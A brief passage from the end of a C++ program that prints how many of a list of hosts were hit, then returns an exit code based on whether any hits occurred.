    printf("[*] done: %d/%zu hosts hit\n", job.hits.load(), hosts.size());
    return job.hits > 0 ? 0 : 1;
}
